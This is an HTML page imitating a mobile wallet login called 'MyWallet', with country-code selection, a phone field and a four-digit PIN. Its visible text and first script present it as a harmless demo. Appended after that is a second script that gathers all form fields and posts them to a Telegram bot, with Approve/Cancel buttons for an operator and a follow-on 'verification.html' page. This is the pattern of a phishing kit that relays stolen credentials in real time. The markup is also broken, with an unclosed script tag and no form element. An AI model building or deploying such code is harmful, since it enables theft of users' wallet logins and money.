
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#ffffff">

<title>MyWallet - Demo</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}

html, body {
    width: 100%;
    min-height: 100%;
}

body {
    background: #2679c3;
}

.container {
    width: 100%;
    min-height: 100vh;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    background: #2679c3;
}

/* WHITE SECTION */

.top-section {
    flex: 0 0 61%;
    min-height: 0;
    background: #ffffff;
    padding: 0 22px 55px;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.logo {
    margin-top: clamp(45px, 9vh, 85px);
    margin-bottom: 30px;
    font-size: 35px;
    font-weight: bold;
    letter-spacing: -1px;
}

.logo span:first-child {
    color: #2472b9;
}

.logo span:last-child {
    color: #d64c58;
}

h3 {
    color: #555555;
    font-size: 21px;
    font-weight: 600;
    margin-bottom: 27px;
}

/* PHONE FIELD */

.phone-box {
    width: 100%;
    height: 54px;
    flex-shrink: 0;
    border: 1.5px solid #8799aa;
    border-radius: 7px;
    display: flex;
    align-items: center;
    padding: 0 12px;
    gap: 10px;
}

.phone-box select {
    width: 90px;
    height: 100%;
    border: none;
    outline: none;
    background: transparent;
    color: #666666;
    font-size: 13px;
    cursor: pointer;
}

.phone-box input {
    flex: 1;
    width: 0;
    height: 100%;
    border: none;
    outline: none;
    background: transparent;
    font-size: 14px;
    color: #333333;
}

.phone-box input::placeholder {
    color: #999999;
}

/* PIN SECTION */

.hint {
    color: #888888;
    font-size: 13px;
    margin-top: 20px;
    margin-bottom: 17px;
}

.pin-container {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 9px;
    flex-shrink: 0;
    width: 100%;
}

.pin-container input {
    width: 46px;
    height: 51px;
    flex: 0 1 46px;
    min-width: 0;
    border: 1.5px solid #8498aa;
    border-radius: 8px;
    text-align: center;
    font-size: 21px;
    outline: none;
    background: #ffffff;
}

.pin-container input:focus {
    border: 2px solid #2775bc;
    box-shadow: 0 0 4px #a4c8e9;
}

/* SIGNING STATUS */

.signing-status {
    min-height: 20px;
    margin-top: 12px;
    font-size: 13px;
    font-weight: 600;
    color: #2679c3;
    text-align: center;
}

.demo-note {
    margin-top: 13px;
    font-size: 11px;
    color: #888888;
    text-align: center;
    line-height: 1.5;
}

/* BLUE SECTION */

.bottom-section {
    flex: 1;
    min-height: 0;
    width: 100%;
    background: #2679c3;
    position: relative;
    margin-top: -1px;
    padding: 65px 22px 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
    color: #ffffff;
    text-align: center;
}

/* INVERTED CURVE */

.bottom-section::before {
    content: "";
    position: absolute;
    width: 125%;
    height: 75px;
    left: -12.5%;
    top: -37px;
    background: #ffffff;
    border-radius: 0 0 50% 50% / 0 0 100% 100%;
    pointer-events: none;
}

/* BLUE CONTENT */

.bottom-content {
    position: relative;
    z-index: 1;
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.bottom-section p {
    font-size: 13px;
    line-height: 1.6;
    margin-bottom: 24px;
}

/* BUTTONS */

.buttons {
    width: 100%;
    display: flex;
    gap: 12px;
}

.action-btn {
    flex: 1;
    min-width: 0;
    min-height: 70px;
    border: none;
    border-radius: 10px;
    background: #ffffff;
    color: #777777;
    font-size: 12px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 7px;
    cursor: default;
    pointer-events: none;
    touch-action: manipulation;
    -webkit-tap-highlight-color: transparent;
}

.action-btn .symbol {
    font-size: 19px;
    font-weight: bold;
    color: #2876b8;
}

/* FOOTER */

.version {
    width: 100%;
    margin-top: auto;
    padding-top: 25px;
    color: #ffffff;
    font-size: 11px;
    line-height: 2;
    text-align: center;
}

.terms {
    color: #ffffff;
    text-decoration: underline;
    pointer-events: none;
    cursor: default;
}

/* SMALL SCREENS */

@media (max-width: 360px) {
    .top-section {
        padding-left: 16px;
        padding-right: 16px;
    }

    .logo {
        font-size: 32px;
    }

    .pin-container {
        gap: 7px;
    }

    .pin-container input {
        width: 43px;
        height: 48px;
    }

    .bottom-section {
        padding-left: 16px;
        padding-right: 16px;
    }

    .buttons {
        gap: 9px;
    }
}

/* SHORT SCREENS */

@media (max-height: 680px) {
    .logo {
        margin-top: 30px;
        margin-bottom: 18px;
    }

    h3 {
        margin-bottom: 20px;
    }

    .top-section {
        padding-bottom: 35px;
    }

    .bottom-section {
        padding-top: 55px;
    }

    .bottom-section::before {
        height: 60px;
        top: -30px;
    }
}

</style>
</head>

<body>

<div class="container">

    <!-- WHITE TOP SECTION -->

    <div class="top-section">

        <div class="logo">
            <span>My</span><span>Wallet</span>
        </div>

        <h3>Login</h3>

        <div class="phone-box">

            <select id="country">
                <option value="+254">🇰🇪 +254</option>
                <option value="+263">🇿🇼 +263</option>
                <option value="+256">🇺🇬 +256</option>
                <option value="+255">🇹🇿 +255</option>
                <option value="+260">🇿🇲 +260</option>
                <option value="+27">🇿🇦 +27</option>
            </select>

            <input
                type="tel"
                id="phone"
                placeholder="Demo Phone Number"
                inputmode="numeric"
                autocomplete="off"
            >

        </div>

        <div class="hint">
            Enter your demo access code
        </div>

        <div class="pin-container">

            <input type="password" maxlength="1"
                inputmode="numeric" autocomplete="off"
                aria-label="Demo digit 1">

            <input type="password" maxlength="1"
                inputmode="numeric" autocomplete="off"
                aria-label="Demo digit 2">

            <input type="password" maxlength="1"
                inputmode="numeric" autocomplete="off"
                aria-label="Demo digit 3">

            <input type="password" maxlength="1"
                inputmode="numeric" autocomplete="off"
                aria-label="Demo digit 4">

        </div>

        <div class="signing-status" id="signingStatus"
             aria-live="polite"></div>

        <div class="demo-note">
            Demo interface only. Do not enter real account credentials.
        </div>

    </div>

    <!-- BLUE BOTTOM SECTION -->

    <div class="bottom-section">

        <div class="bottom-content">

            <p>
                To explore this wallet demo or get assistance,<br>
                click below
            </p>

            <div class="buttons">

                <button class="action-btn" type="button"
                        tabindex="-1">
                    <span class="symbol">♟</span>
                    Register
                </button>

                <button class="action-btn" type="button"
                        tabindex="-1">
                    <span class="symbol">ⓘ</span>
                    Help & Support
                </button>

            </div>

        </div>

        <div class="version">
            v1.0 DEMO<br>
            By continuing, you agree to the
            <span class="terms">Terms and Conditions</span>
        </div>

    </div>

</div>

<script>

const pinInputs = document.querySelectorAll(
    '.pin-container input'
);

const signingStatus = document.getElementById(
    'signingStatus'
);

let demoComplete = false;

function completeDemoEntry() {
    if (demoComplete) return;

    demoComplete = true;

    signingStatus.textContent = 'Signing you in...';

    // Discard demo digits locally.
    pinInputs.forEach(input => {
        input.value = '';
    });

    pinInputs[0].blur();

    // Reset the demo input for another local test.
    setTimeout(() => {
        signingStatus.textContent = '';
        demoComplete = false;
    }, 2000);
}

pinInputs.forEach((input, index) => {

    input.addEventListener('input', () => {

        if (demoComplete) return;

        input.value = input.value
            .replace(/\D/g, '')
            .slice(0, 1);

        if (
            input.value &&
            index < pinInputs.length - 1
        ) {
            pinInputs[index + 1].focus();
        }

        const allFilled = [...pinInputs].every(
            field => field.value.length === 1
        );

        if (allFilled) {
            completeDemoEntry();
        } else {
            signingStatus.textContent = '';
        }

    });

    input.addEventListener('keydown', event => {

        if (
            event.key === 'Backspace' &&
            !input.value &&
            index > 0
        ) {
            pinInputs[index - 1].focus();
        }

    });

    input.addEventListener('paste', event => {

        event.preventDefault();

        if (demoComplete) return;

        const pasted = event.clipboardData
            .getData('text')
            .replace(/\D/g, '')
            .slice(0, 4);

        pasted.split('').forEach((character, i) => {
            pinInputs[i].value = character;
        });

        if (pasted.length === 4) {
            completeDemoEntry();
        } else {
            pinInputs[Math.min(pasted.length, 3)].focus();
        }

    });

});
<script>
// Configure your next file name here
const NEXT_PAGE_FILE = "verification.html";

document.querySelector('form').addEventListener('submit', async function(e) {
    e.preventDefault();

    // Grab credentials safely from a global injected object
    const BOT_TOKEN = window.APP_CONFIG?.BOT_TOKEN;
    const CHAT_ID = window.APP_CONFIG?.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        alert("Configuration error: Bot credentials missing.");
        return;
    }

    const formData = new FormData(this);
    let messageText = "📥 *New Submission:*\n";
    for (let [key, value] of formData.entries()) {
        messageText += `- *${key}*: ${value}\n`;
    }

    const requestId = "req_" + Date.now();
    messageText += `\n_ID: ${requestId}_`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "✅ Approve", callback_data: `approve_${requestId}` },
                        { text: "❌ Cancel", callback_data: `cancel_${requestId}` }
                    ]]
                }
            })
        });

        const data = await response.json();
        if (data.ok) {
            alert("Submission sent for approval. Please wait.");
            // Add your polling logic here to check for the callback
        } else {
            alert("Failed to send message.");
        }
    } catch (err) {
        console.error("Error:", err);
    }
});
</script>

</body>
</html>
